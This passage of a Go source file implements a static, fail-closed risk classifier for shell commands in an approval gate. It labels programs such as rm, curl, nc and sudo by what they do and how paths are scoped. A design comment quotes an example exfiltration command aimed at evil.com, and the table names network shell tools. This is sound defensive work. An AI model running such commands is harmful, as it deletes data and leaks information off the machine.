package compute

import (
	"context"
	"fmt"
	"path"
	"sort"
	"strings"
	"sync/atomic"
	"unicode"
	"unicode/utf8"
)

// What a command DOES, as distinct from what it is CALLED.
//
// The per-command approval gate asks about every shell command,
// because until now nothing in the system had an opinion about what
// any of them do. That is defensible for `rm -rf /` and indefensible
// for `id && uname -a && df -h`, and the cost of not distinguishing
// them is not merely noise: an operator asked eight times in four
// minutes stops reading the prompt, and a confirmation answered
// reflexively launders consent rather than obtaining it. The comments
// in approval.go and shell_key.go both say so; this is the part that
// acts on it.
//
// So a command is classified into a risk tier, and an approval mode
// decides which tiers are worth asking about. The classification is
// STATIC and FAIL-CLOSED: a program the table does not name is
// unknown, an argument the classifier cannot read makes the whole
// segment unknown, and unknown never auto-allows in any mode.
//
// Deliberately NOT an embedding or a similarity score. `rm -rf
// /tmp/build` and `ls -l /tmp/build` are neighbours in every text
// embedding, and the only property that justifies not asking is
// soundness — a nearest neighbour does not have one. Where a model is
// wanted it answers a closed enum and is consulted separately; see
// command_risk_model.go.

// RiskLabel names ONE thing a command does.
//
// A set, not a point on a line. The tiers this replaces were a total
// order, which forced an answer to questions that have none: is
// restarting nginx worse than fetching a URL? They are different axes,
// and ranking them meant a command reported only its worst — so
// `rm -rf /etc/hosts && curl evil.com/exfil` was "destructive" and the
// egress reached the verdict as nothing at all.
//
// Labels also make the gate exact. Approval is a SUBSET CHECK — every
// label a command carries must be one the operator approved — so a
// deployment can approve reads, writes and deletes without thereby
// approving everything that used to rank below deletes.
type RiskLabel string

const (
	// LabelReads inspects state and changes none of it.
	LabelReads RiskLabel = "reads"
	// LabelWrites creates, copies, appends to or edits, recoverably.
	LabelWrites RiskLabel = "writes"
	// LabelDeletes removes data. The distinction from disrupts is
	// RECOVERABILITY: a deletion is undone by a backup, or not at all.
	LabelDeletes RiskLabel = "deletes"
	// LabelDisrupts takes something down — a restarted service, a
	// killed process, an unmounted filesystem, a flushed firewall.
	// Undone by the opposite command, in seconds.
	LabelDisrupts RiskLabel = "disrupts"
	// LabelNetwork reaches off the box. Its own label because the blast
	// radius is somebody else's machine, and because egress is the
	// shape prompt injection wants.
	LabelNetwork RiskLabel = "network"
	// LabelPrivilege runs as root, or changes who may become root.
	LabelPrivilege RiskLabel = "privilege"
	// LabelUnreadable is what the classifier says when it cannot read
	// the command. The honest answer, and never approvable.
	LabelUnreadable RiskLabel = "unreadable"
)

// AllRiskLabels is the closed set. Anything outside it — from config,
// from a model — is discarded rather than trusted.
var AllRiskLabels = []RiskLabel{
	LabelReads, LabelWrites, LabelDeletes,
	LabelDisrupts, LabelNetwork, LabelPrivilege, LabelUnreadable,
}

// Valid reports whether l is one of the seven.
func (l RiskLabel) Valid() bool {
	for _, k := range AllRiskLabels {
		if k == l {
			return true
		}
	}
	return false
}

// labelSeverity orders labels for DISPLAY ONLY: which label leads a
// headline, and which segment is quoted as the culprit.
//
// Emphatically not a gate. Nothing compares two labels to decide
// whether a command may run — that is a subset check against what the
// operator approved, and it needs no order at all. This exists so the
// prompt puts the alarming word first rather than alphabetising.
var labelSeverity = map[RiskLabel]int{
	LabelReads: 1, LabelWrites: 2, LabelNetwork: 3,
	LabelDisrupts: 4, LabelDeletes: 5, LabelPrivilege: 6, LabelUnreadable: 7,
}

// L builds a label set, keeping the table readable.
func L(labels ...RiskLabel) []RiskLabel { return labels }

// mergeLabels unions sets, dropping duplicates and ordering by display
// severity so the same command always renders the same way.
func mergeLabels(sets ...[]RiskLabel) []RiskLabel {
	seen := map[RiskLabel]bool{}
	var out []RiskLabel
	for _, set := range sets {
		for _, l := range set {
			if l == "" || seen[l] {
				continue
			}
			seen[l] = true
			out = append(out, l)
		}
	}
	// "reads" means reads AND NOTHING ELSE.
	//
	// Every command reads something — `sed -i` reads the file it
	// rewrites, `rm` reads the directory it empties — so carrying the
	// label alongside a stronger one adds a word and no information.
	// Worse, it would make an approved set of exactly {writes} reject
	// `sed -i`, which is not what anybody writing that meant.
	if len(out) > 1 {
		kept := out[:0]
		for _, l := range out {
			if l != LabelReads {
				kept = append(kept, l)
			}
		}
		out = kept
	}
	sort.SliceStable(out, func(i, j int) bool {
		return labelSeverity[out[i]] > labelSeverity[out[j]]
	})
	return out
}

// hasLabel reports set membership.
func hasLabel(set []RiskLabel, want RiskLabel) bool {
	for _, l := range set {
		if l == want {
			return true
		}
	}
	return false
}

// severityOf is the highest display-severity in a set. Display only.
func severityOf(labels []RiskLabel) int {
	worst := 0
	for _, l := range labels {
		if labelSeverity[l] > worst {
			worst = labelSeverity[l]
		}
	}
	return worst
}

// RenderLabels writes a label set for a person: severest first, joined
// with "+". Empty renders as "unclassified".
func RenderLabels(set []RiskLabel) string {
	if len(set) == 0 {
		return "unclassified"
	}
	parts := make([]string, 0, len(set))
	for _, l := range set {
		parts = append(parts, string(l))
	}
	return strings.Join(parts, " + ")
}

// CommandRiskRule is how one program name is classified.
//
// Shaped like CommandClass in command_class.go: a compiled table an
// operator extends through config rather than a heuristic. The extra
// fields exist because a program name alone is not always enough —
// `git status` and `git clean -fdx` are the same program.
type CommandRiskRule struct {
	// Tier applies when nothing below does.
	Labels []RiskLabel

	// Sub classifies by the first non-flag argument, for programs that
	// are really a family of commands: git, podman, systemctl, apt-get.
	// A subcommand the map does not name is UNKNOWN rather than Tier —
	// a git subcommand nobody classified could be anything.
	Sub map[string][]RiskLabel

	// OperandTier applies when the segment carries at least one
	// non-flag operand. For programs that report when bare and act when
	// given something to act on: `mount` lists mounts, `mount /dev/sda1
	// /mnt` does not.
	OperandLabels []RiskLabel

	// Targets marks a program whose risk is decided by WHAT IT IS
	// POINTED AT rather than by its name.
	//
	// `rm /tmp/probe.txt`, `rm -rf /` and `rm -rf $DIR` are the same
	// program and three different operations, and a classifier that
	// calls all three "destructive" is telling the user nothing they
	// can act on — which is how a prompt becomes a reflex. So a
	// targeting program's operands are read as paths: a system path
	// raises the tier, a path under a declared scratch root lowers it
	// to ScratchTier, and a path whose value we cannot see makes the
	// segment unknown.
	Targets bool

	// ScratchTier is the tier when EVERY target is under a scratch
	// root. Only consulted when Targets is set, and only ever lower
	// than Tier — this is the de-escalation, and it is the only one in
	// the classifier.
	ScratchLabels []RiskLabel

	// TargetLast means only the final operand is written to and the
	// rest are read. `cp /etc/passwd /tmp/x` copies a system file to a
	// scratch one; scoping the source would report a change to the
	// machine that is not happening. `mv` is deliberately NOT in this
	// category — moving something out of /etc does change the machine.
	TargetLast bool

	// Escalate raises the tier when a token is present. Keys match a
	// token exactly, or as a prefix when they end in "*" — the same
	// wildcard convention policy patterns use, and the reason `sed
	// -i.bak` is caught alongside `sed -i`.
	Escalate map[string][]RiskLabel

	// Reason overrides the tier's generic reason code, for entries
	// where it would say nothing. Every interpreter classifies as
	// unknown, and telling somebody `sh` is "unreadable" is true and
	// useless — "runs_unread_code" is the thing they can act on.
	Why string
}

// DefaultCommandRisks is the shipped table.
//
// Incomplete on purpose and safe anyway: a program that is not here is
// L(LabelUnreadable), which asks. Entries are added when somebody has thought
// about what the program does with every flag it might carry, not to
// make the table look finished.
//
// Operators extend or override it via [compute.command_risks].
var DefaultCommandRisks = map[string]CommandRiskRule{
	// Inspection. Nothing here writes anywhere with the flags shown;
	// the ones that CAN write carry an escalation.
	"ls": {Labels: L(LabelReads)}, "dir": {Labels: L(LabelReads)}, "vdir": {Labels: L(LabelReads)},
	"cat": {Labels: L(LabelReads)}, "head": {Labels: L(LabelReads)}, "tail": {Labels: L(LabelReads)},
	"wc": {Labels: L(LabelReads)}, "nl": {Labels: L(LabelReads)}, "tac": {Labels: L(LabelReads)},
	"grep": {Labels: L(LabelReads)}, "egrep": {Labels: L(LabelReads)}, "fgrep": {Labels: L(LabelReads)},
	"rg": {Labels: L(LabelReads)}, "ag": {Labels: L(LabelReads)},
	"stat": {Labels: L(LabelReads)}, "file": {Labels: L(LabelReads)}, "du": {Labels: L(LabelReads)},
	"df": {Labels: L(LabelReads)}, "id": {Labels: L(LabelReads)}, "groups": {Labels: L(LabelReads)},
	"whoami": {Labels: L(LabelReads)}, "logname": {Labels: L(LabelReads)},
	"uname": {Labels: L(LabelReads)}, "hostname": {Labels: L(LabelReads)}, "uptime": {Labels: L(LabelReads)},
	"date": {Labels: L(LabelReads)}, "cal": {Labels: L(LabelReads)}, "locale": {Labels: L(LabelReads)},
	"printenv": {Labels: L(LabelReads)}, "echo": {Labels: L(LabelReads)}, "printf": {Labels: L(LabelReads)},
	"true": {Labels: L(LabelReads)}, "false": {Labels: L(LabelReads)}, "test": {Labels: L(LabelReads)},
	"[": {Labels: L(LabelReads)}, "seq": {Labels: L(LabelReads)}, "yes": {Labels: L(LabelReads)},
	"which": {Labels: L(LabelReads)}, "command": {Labels: L(LabelReads)}, "type": {Labels: L(LabelReads)},
	"whereis": {Labels: L(LabelReads)}, "hash": {Labels: L(LabelReads)},
	"ps": {Labels: L(LabelReads)}, "pgrep": {Labels: L(LabelReads)}, "pidof": {Labels: L(LabelReads)},
	"free": {Labels: L(LabelReads)}, "vmstat": {Labels: L(LabelReads)}, "iostat": {Labels: L(LabelReads)},
	"lsblk": {Labels: L(LabelReads)}, "lscpu": {Labels: L(LabelReads)}, "lspci": {Labels: L(LabelReads)},
	"lsusb": {Labels: L(LabelReads)}, "lsmod": {Labels: L(LabelReads)}, "lsns": {Labels: L(LabelReads)},
	"getent": {Labels: L(LabelReads)}, "getconf": {Labels: L(LabelReads)}, "ulimit": {Labels: L(LabelReads)},
	"dmesg": {Labels: L(LabelReads)}, "journalctl": {Labels: L(LabelReads)},
	"sha1sum": {Labels: L(LabelReads)}, "sha256sum": {Labels: L(LabelReads)}, "md5sum": {Labels: L(LabelReads)},
	"cksum": {Labels: L(LabelReads)}, "b2sum": {Labels: L(LabelReads)},
	"diff": {Labels: L(LabelReads)}, "cmp": {Labels: L(LabelReads)}, "comm": {Labels: L(LabelReads)},
	"sort": {Labels: L(LabelReads)}, "uniq": {Labels: L(LabelReads)}, "cut": {Labels: L(LabelReads)},
	"paste": {Labels: L(LabelReads)}, "join": {Labels: L(LabelReads)}, "column": {Labels: L(LabelReads)},
	"tr": {Labels: L(LabelReads)}, "rev": {Labels: L(LabelReads)}, "fold": {Labels: L(LabelReads)},
	"od": {Labels: L(LabelReads)}, "xxd": {Labels: L(LabelReads)}, "hexdump": {Labels: L(LabelReads)},
	"strings": {Labels: L(LabelReads)}, "ldd": {Labels: L(LabelReads)}, "nm": {Labels: L(LabelReads)},
	"basename": {Labels: L(LabelReads)}, "dirname": {Labels: L(LabelReads)},
	"readlink": {Labels: L(LabelReads)}, "realpath": {Labels: L(LabelReads)}, "pwd": {Labels: L(LabelReads)},
	"jq": {Labels: L(LabelReads)}, "yq": {Labels: L(LabelReads)},

	// Reads by default, writes when told to.
	"sed": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
		"-i*": L(LabelWrites), "--in-place*": L(LabelWrites),
	}},
	"find": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
		"-delete": L(LabelDeletes), "-exec": L(LabelUnreadable), "-execdir": L(LabelUnreadable),
		"-ok": L(LabelUnreadable), "-okdir": L(LabelUnreadable), "-fprint*": L(LabelWrites),
	}},
	"tar": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
		"-x*": L(LabelWrites), "--extract": L(LabelWrites), "-c*": L(LabelWrites), "--create": L(LabelWrites),
		"--delete": L(LabelDeletes),
	}},
	"unzip": {Labels: L(LabelWrites)}, "zip": {Labels: L(LabelWrites)}, "gzip": {Labels: L(LabelWrites)},
	"gunzip": {Labels: L(LabelWrites)}, "zcat": {Labels: L(LabelReads)},
	// `mount` bare lists; `mount <device> <point>` acts.
	"mount":  {Labels: L(LabelReads), OperandLabels: L(LabelDisrupts)},
	"umount": {Labels: L(LabelDisrupts)},
	"swapon": {Labels: L(LabelReads), OperandLabels: L(LabelDisrupts)},

	// Local mutation, ordinarily recoverable. Targeting, so that
	// writing into /etc is not filed alongside writing into /tmp.
	"touch": {Labels: L(LabelWrites), Targets: true}, "mkdir": {Labels: L(LabelWrites), Targets: true},
	"mktemp":  {Labels: L(LabelWrites)},
	"cp":      {Labels: L(LabelWrites), Targets: true, TargetLast: true},
	"mv":      {Labels: L(LabelWrites), Targets: true},
	"ln":      {Labels: L(LabelWrites), Targets: true},
	"install": {Labels: L(LabelWrites), Targets: true, TargetLast: true},
	"tee":     {Labels: L(LabelWrites), Targets: true},
	"mkfifo":  {Labels: L(LabelWrites), Targets: true},
	"patch":   {Labels: L(LabelWrites), Targets: true}, "split": {Labels: L(LabelWrites), Targets: true},
	"chmod": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
	}},
	"chown": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
	}},
	"chgrp": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
	}},

	// Reaching off the box. curl/wget/ssh and friends are ALSO in
	// DefaultCommandClasses, which is where the action comes from; they
	// are repeated here so that an operator who unclassifies one
	// (action = "") does not thereby make it look read-only.
	"curl": {Labels: L(LabelNetwork)}, "wget": {Labels: L(LabelNetwork)},
	"ssh": {Labels: L(LabelNetwork)}, "scp": {Labels: L(LabelNetwork)},
	"rsync": {Labels: L(LabelNetwork)}, "rclone": {Labels: L(LabelNetwork)},
	"sftp": {Labels: L(LabelNetwork)}, "ftp": {Labels: L(LabelNetwork)},
	"nc": {Labels: L(LabelNetwork)}, "ncat": {Labels: L(LabelNetwork)}, "socat": {Labels: L(LabelNetwork)},
	"telnet": {Labels: L(LabelNetwork)}, "ping": {Labels: L(LabelNetwork)},
	"dig": {Labels: L(LabelNetwork)}, "host": {Labels: L(LabelNetwork)}, "nslookup": {Labels: L(LabelNetwork)},
	"traceroute": {Labels: L(LabelNetwork)}, "ip": {Labels: L(LabelReads), OperandLabels: L(LabelReads)},

	// Removal, machine state, privilege. The file-deleting ones target;
	// the disk-writing ones do not, because dd and mkfs are pointed at
	// devices and there is no scratch device.
	"rm":       {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
	"rmdir":    {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
	"shred":    {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
	"truncate": {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
	"dd":       {Labels: L(LabelDeletes, LabelDisrupts)}, "mkfs": {Labels: L(LabelDeletes, LabelDisrupts)},
	"fdisk": {Labels: L(LabelDeletes, LabelDisrupts)}, "parted": {Labels: L(LabelDeletes, LabelDisrupts)},
	"wipefs": {Labels: L(LabelDeletes, LabelDisrupts)}, "sfdisk": {Labels: L(LabelDeletes, LabelDisrupts)},
	"kill": {Labels: L(LabelDisrupts)}, "pkill": {Labels: L(LabelDisrupts)},
	"killall": {Labels: L(LabelDisrupts)}, "xkill": {Labels: L(LabelDisrupts)},
	"shutdown": {Labels: L(LabelDisrupts)}, "reboot": {Labels: L(LabelDisrupts)},
	"halt": {Labels: L(LabelDisrupts)}, "poweroff": {Labels: L(LabelDisrupts)},
	"iptables": {Labels: L(LabelDisrupts, LabelPrivilege)}, "nft": {Labels: L(LabelDisrupts, LabelPrivilege)},
	"useradd": {Labels: L(LabelPrivilege)}, "userdel": {Labels: L(LabelPrivilege, LabelDeletes)},
	"usermod": {Labels: L(LabelPrivilege)}, "groupadd": {Labels: L(LabelPrivilege)},
	"groupdel": {Labels: L(LabelPrivilege)}, "passwd": {Labels: L(LabelPrivilege)},
	"visudo": {Labels: L(LabelPrivilege)}, "crontab": {Labels: L(LabelPrivilege, LabelWrites)},
	"insmod": {Labels: L(LabelDisrupts, LabelPrivilege)}, "rmmod": {Labels: L(LabelDisrupts, LabelPrivilege)},
	"modprobe": {Labels: L(LabelDisrupts, LabelPrivilege)},

	// Families. A subcommand the map does not name is unknown.
	"git": {Labels: L(LabelReads), Sub: map[string][]RiskLabel{
		"status": L(LabelReads), "log": L(LabelReads), "diff": L(LabelReads), "show": L(LabelReads),
		"branch": L(LabelReads), "describe": L(LabelReads), "blame": L(LabelReads), "config": L(LabelReads),
		"rev-parse": L(LabelReads), "ls-files": L(LabelReads), "ls-remote": L(LabelNetwork),
		"shortlog": L(LabelReads), "tag": L(LabelWrites), "stash": L(LabelWrites),
		"add": L(LabelWrites), "commit": L(LabelWrites), "checkout": L(LabelWrites),
		"switch": L(LabelWrites), "restore": L(LabelWrites), "merge": L(LabelWrites),
		"rebase": L(LabelWrites), "cherry-pick": L(LabelWrites), "revert": L(LabelWrites),
		"apply": L(LabelWrites), "am": L(LabelWrites), "init": L(LabelWrites), "worktree": L(LabelWrites),
		"clone": L(LabelNetwork), "fetch": L(LabelNetwork), "pull": L(LabelNetwork),
		"push": L(LabelNetwork), "remote": L(LabelNetwork), "submodule": L(LabelNetwork),
		"clean": L(LabelDeletes), "reset": L(LabelWrites), "gc": L(LabelDeletes),
		"prune": L(LabelDeletes), "filter-branch": L(LabelDeletes),
	}, Escalate: map[string][]RiskLabel{
		"--hard": L(LabelDeletes), "--force": L(LabelDeletes), "-f": L(LabelDeletes),
	}},
	"podman": containerRisk, "docker": containerRisk, "nerdctl": containerRisk,
	"systemctl": {Labels: L(LabelReads), Sub: map[string][]RiskLabel{
		"status": L(LabelReads), "show": L(LabelReads), "cat": L(LabelReads), "list-units": L(LabelReads),
		"list-unit-files": L(LabelReads), "is-active": L(LabelReads), "is-enabled": L(LabelReads),
		"start": L(LabelDisrupts), "stop": L(LabelDisrupts), "restart": L(LabelDisrupts),
		"reload": L(LabelDisrupts), "enable": L(LabelDisrupts, LabelWrites), "disable": L(LabelDisrupts, LabelWrites),
		"mask": L(LabelDisrupts, LabelWrites), "unmask": L(LabelDisrupts, LabelWrites), "daemon-reload": L(LabelDisrupts),
	}},
	"apt-get": packageRisk, "apt": packageRisk, "apt-cache": {Labels: L(LabelReads)},
	"dnf": packageRisk, "yum": packageRisk, "zypper": packageRisk,
	"pacman": {Labels: L(LabelUnreadable)}, "apk": packageRisk,
	"dpkg": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
		"-i": L(LabelWrites), "--install": L(LabelWrites),
		"-r": L(LabelDeletes), "--remove": L(LabelDeletes), "--purge": L(LabelDeletes),
	}},
	"rpm": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
		"-i": L(LabelWrites), "--install": L(LabelWrites),
		"-e": L(LabelDeletes), "--erase": L(LabelDeletes),
	}},
	"pip": pipRisk, "pip3": pipRisk,
	"npm": {Labels: L(LabelUnreadable), Sub: map[string][]RiskLabel{
		"ls": L(LabelReads), "list": L(LabelReads), "view": L(LabelNetwork), "outdated": L(LabelNetwork),
		"install": L(LabelNetwork), "ci": L(LabelNetwork), "publish": L(LabelNetwork),
		"uninstall": L(LabelWrites), "prune": L(LabelWrites),
	}},

	// Named so the prompt can say WHY rather than "not in the table".
	// Each of these runs code the classifier has not read.
	"sh": runsCode, "bash": runsCode, "zsh": runsCode, "dash": runsCode,
	"ksh": runsCode, "fish": runsCode, "eval": runsCode, "exec": runsCode,
	"source": runsCode, ".": runsCode,
	"xargs": runsCode, "parallel": runsCode, "watch": runsCode,
	"awk": runsCode, "gawk": runsCode, "mawk": runsCode, "perl": runsCode,
	"python": runsCode, "python3": runsCode, "ruby": runsCode, "php": runsCode,
	"node": runsCode, "deno": runsCode, "bun": runsCode,
	"make": runsCode, "cmake": runsCode, "cargo": runsCode, "go": runsCode,
	"gcc": runsCode, "cc": runsCode, "rustc": runsCode, "javac": runsCode,
	"unshare": newNamespace, "nsenter": newNamespace, "chroot": newNamespace,
}

// containerRisk is shared by the container CLIs, which are the same
// verbs with different names on the front.
var containerRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
	"ps": L(LabelReads), "images": L(LabelReads), "image": L(LabelReads), "inspect": L(LabelReads),
	"logs": L(LabelReads), "info": L(LabelReads), "version": L(LabelReads), "top": L(LabelReads),
	"port": L(LabelReads), "diff": L(LabelReads), "stats": L(LabelReads),
	"pull": L(LabelNetwork), "push": L(LabelNetwork), "login": L(LabelNetwork), "search": L(LabelNetwork),
	"build": L(LabelWrites), "commit": L(LabelWrites), "tag": L(LabelWrites), "save": L(LabelWrites),
	"load": L(LabelWrites), "create": L(LabelWrites), "cp": L(LabelWrites),
	"run": L(LabelUnreadable), "exec": L(LabelUnreadable), "start": L(LabelUnreadable), "attach": L(LabelUnreadable),
	"rm": L(LabelDeletes, LabelDisrupts), "rmi": L(LabelDeletes), "kill": L(LabelDisrupts),
	"stop": L(LabelDisrupts), "prune": L(LabelDeletes), "system": L(LabelDeletes, LabelDisrupts),
	"volume": L(LabelDeletes), "network": L(LabelDisrupts),
}}

// packageRisk covers the distro package managers, which all reach the
// network to install and remove things locally to uninstall.
var packageRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
	"list": L(LabelReads), "show": L(LabelReads), "search": L(LabelReads), "policy": L(LabelReads),
	"info": L(LabelReads), "depends": L(LabelReads),
	"update": L(LabelNetwork), "install": L(LabelNetwork), "upgrade": L(LabelNetwork),
	"dist-upgrade": L(LabelNetwork), "download": L(LabelNetwork), "source": L(LabelNetwork),
	"remove": L(LabelDeletes), "purge": L(LabelDeletes), "autoremove": L(LabelDeletes),
	"erase": L(LabelDeletes), "clean": L(LabelDeletes),
}}

// pipRisk is the python package manager, whose install reaches out and
// whose uninstall does not.
var pipRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
	"list": L(LabelReads), "show": L(LabelReads), "freeze": L(LabelReads), "check": L(LabelReads),
	"config":  L(LabelReads),
	"install": L(LabelNetwork), "download": L(LabelNetwork), "wheel": L(LabelNetwork),
	"uninstall": L(LabelDeletes),
}}

// runsCode is every interpreter, build tool and re-execing wrapper.
//
// Unknown rather than a tier of their own: what `bash -c "$X"` does is
// whatever X does, and there is no honest tier for that. Naming them
// here rather than letting them fall through to "unrecognised" is what
// lets the prompt say "runs code this classifier has not read".
var runsCode = CommandRiskRule{Labels: L(LabelUnreadable), Why: "runs_unread_code"}

// newNamespace covers unshare/nsenter/chroot: the program that follows
// runs somewhere with different rules, so reading its argv here would
// describe the wrong thing.
var newNamespace = CommandRiskRule{Labels: L(LabelUnreadable), Why: "runs_in_new_namespace"}

// The reason vocabulary this replaces was a per-tier map whose
// destructive entry read "deletes_or_changes_machine_state" — an "or"
// in a category name, which is a category telling you it is two
// categories. The labels ARE the reason now, and `Why` below carries
// only the READING that produced them where that is not obvious from
// the program: a scratch path, a system path, an unreadable construct.

// pathScope is what a target path is part of.
type pathScope int

const (
	// scopeOrdinary is a path that is neither scratch nor system: the
	// project checkout, a data directory, somebody's work.
	scopeOrdinary pathScope = iota
	// scopeScratch is a declared throwaway root. Deleting inside one is
	// a write, not a loss.
	scopeScratch
	// scopeSystem is the machine itself.
	scopeSystem
	// scopeOpaque is a path whose value we cannot see — an expansion, a
	// substitution. `rm -rf $DIR` is not `rm -rf /tmp/x` and must never
	// be classified as though it were.
	scopeOpaque
)

// systemRoots are the paths where a write is a change to the machine
// rather than to somebody's files.
//
// Prefix-matched after cleaning, so /etc/systemd/system/x.service is
// system and /etcetera is not. This is NOT the hardline floor and does
// not pretend to be — the floor is enforced in internal/policy and is
// the only unpromptable layer. This list decides what a PROMPT SAYS
// and, in trusted mode, what is worth stopping for.
var systemRoots = []string{
	"/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64", "/boot",
	"/dev", "/proc", "/sys", "/run", "/root", "/opt", "/srv",
	"/var", "/home", "/mnt", "/media",
}

// defaultScratchPaths are the throwaway roots every deployment has.
//
// A deployment that mounts a workspace adds it through
// [compute.shell_approval] scratch_paths; nothing is assumed about
// /workspace or the cwd, because guessing that a directory is
// disposable is the one error in this file that loses data.
var defaultScratchPaths = []string{"/tmp", "/var/tmp"}

// activeScratchPaths is the operator's list, when there is one.
var activeScratchPaths atomic.Pointer[[]string]

// SetScratchPaths installs the roots under which deletion is a write
// rather than a loss. Empty restores the defaults.
func SetScratchPaths(paths []string) {
	clean := make([]string, 0, len(paths))
	for _, p := range paths {
		p = strings.TrimSpace(p)
		// Absolute only. A relative scratch root resolves against
		// whatever directory the process happens to be in, which is
		// exactly the ambiguity a downgrade must not rest on.
		if strings.HasPrefix(p, "/") {
			clean = append(clean, cleanPath(p))
		}
	}
	if len(clean) == 0 {
		activeScratchPaths.Store(nil)
		return
	}
	activeScratchPaths.Store(&clean)
}

// ActiveScratchPaths returns the roots in force.
func ActiveScratchPaths() []string {
	if p := activeScratchPaths.Load(); p != nil {
		return *p
	}
	return defaultScratchPaths
}

// pathScopeOf reads one operand as a path.
//
// A caveat worth stating out loud: this reads what is WRITTEN, not
// what it resolves to. A symlink at /tmp/x pointing into /etc makes
// `rm /tmp/x/conf` look like scratch. That is tolerable because the
// scratch downgrade only ever moves destructive to write, and write
// still asks under every mode except trusted — so the downgrade cannot
// by itself cause anything to run unasked in the shipped default.
func pathScopeOf(tok riskToken) pathScope {
	text := tok.text
	if tok.expands || strings.Contains(text, "$") {
		return scopeOpaque
	}
	if text == "" {
		return scopeOrdinary
	}
	// "~" is the home directory and "~/.ssh" is not scratch; treat the
	// whole shape as opaque rather than guessing whose home it is.
	if strings.HasPrefix(text, "~") {
		return scopeOpaque
	}
	if !strings.HasPrefix(text, "/") {
		// Relative to a working directory we may not have been told
		// about. Ordinary: not scratch (so nothing is downgraded) and
		// not system (so nothing is escalated on a guess).
		return scopeOrdinary
	}
	p := cleanPath(text)
	if p == "/" {
		return scopeSystem
	}
	// Scratch first: /var/tmp is under /var, and the more specific
	// declaration is the one that meant something.
	for _, root := range ActiveScratchPaths() {
		// Strictly under, never equal: `rm -rf /tmp` empties the
		// scratch root itself, which is a different act from deleting
		// something in it.
		if strings.HasPrefix(p, root+"/") {
			return scopeScratch
		}
	}
	for _, root := range systemRoots {
		if p == root || strings.HasPrefix(p, root+"/") {
			return scopeSystem
		}
	}
	return scopeOrdinary
}

// cleanPath normalises a path for prefix comparison without touching
// the filesystem. Traversal is resolved textually, so
// /tmp/../etc/passwd is /etc/passwd and does not borrow /tmp's scope.
func cleanPath(p string) string {
	// A trailing glob segment is kept as a literal: /tmp/build* stays
	// under /tmp, and a bare "*" stays relative, which is what makes
	// `rm -rf *` ordinary rather than scratch.
	cleaned := path.Clean(p)
	if cleaned == "." {
		return p
	}
	return cleaned
}

// applyTargets adjusts a tier by what the command is pointed at.
//
// The three answers, in the order they are decided:
//   - any opaque target: unknown. We cannot say what `rm -rf $DIR`
//     removes, and a tier is a claim.
//   - any system target: at least destructive, whatever the program.
//     `cp payload /usr/bin/ls` is not a copy, it is a takeover.
//   - every target scratch, and the rule offers a ScratchLabels: that.
func applyTargets(labels []RiskLabel, rule CommandRiskRule, operands []riskToken, wroteTo []riskToken) ([]RiskLabel, string) {
	targets := make([]riskToken, 0, len(operands)+len(wroteTo))
	targets = append(targets, operands...)
	targets = append(targets, wroteTo...)
	if len(targets) == 0 {
		return labels, ""
	}

	allScratch := true
	for _, t := range targets {
		switch pathScopeOf(t) {
		case scopeOpaque:
			return L(LabelUnreadable), "opaque_target"
		case scopeSystem:
			// Privilege, whatever the program was doing. Writing into
			// /usr/bin is not a copy, it is a takeover: whoever
			// controls what root executes controls the machine.
			return mergeLabels(labels, L(LabelPrivilege)), "system_path"
		case scopeScratch:
		default:
			allScratch = false
		}
	}
	if allScratch && len(rule.ScratchLabels) > 0 {
		return rule.ScratchLabels, "scratch_path"
	}
	return labels, ""
}

// wrapperSpec describes a program that runs another program.
//
// Unwrapped rather than classified on its own, because `timeout 5 rm
// -rf /` is a deletion wearing a stopwatch. Getting this wrong in the
// permissive direction is the one mistake that matters, so a wrapper
// whose real command cannot be located yields unknown.
type wrapperSpec struct {
	// valueFlags consume the token after them.
	valueFlags map[string]bool
	// skipOperands is how many non-flag arguments come before the
	// command. `timeout 5 ls` has one; `nohup ls` has none.
	skipOperands int
	// root means the wrapped command runs with different privileges,
	// so the result is raised to at least destructive.
	root bool
	// refuseAssign means a VAR=value operand makes the command
	// unreadable — it runs in an environment we did not read, for the
	// reason NormaliseCommand refuses an assignment prefix.
	refuseAssign bool
}

var wrapperCommands = map[string]wrapperSpec{
	"sudo": {root: true, valueFlags: map[string]bool{
		"-u": true, "-g": true, "-p": true, "-C": true, "-h": true,
		"-r": true, "-t": true, "-U": true, "-D": true,
	}, refuseAssign: true},
	"doas":    {root: true, valueFlags: map[string]bool{"-u": true, "-C": true}},
	"pkexec":  {root: true, valueFlags: map[string]bool{"--user": true}},
	"timeout": {skipOperands: 1, valueFlags: map[string]bool{"-s": true, "--signal": true, "-k": true, "--kill-after": true}},
	"nice":    {valueFlags: map[string]bool{"-n": true, "--adjustment": true}},
	"ionice":  {valueFlags: map[string]bool{"-c": true, "-n": true, "-p": true}},
	"nohup":   {},
	"stdbuf":  {valueFlags: map[string]bool{"-i": true, "-o": true, "-e": true}},
	"env":     {refuseAssign: true},
	"setsid":  {},
}

// RiskSegment is one command in a compound command line.
type RiskSegment struct {
	// Raw is the segment as written, so the prompt can quote the exact
	// part that caused the ask rather than the whole line.
	Raw string `json:"raw"`
	// Program is the program name as invoked, with any path stripped.
	Program string `json:"program,omitempty"`
	// Via is the privilege wrapper the program ran under — sudo, doas,
	// pkexec — when there was one. Named separately because a headline
	// reading "destructive · true" for `sudo -n true` describes the
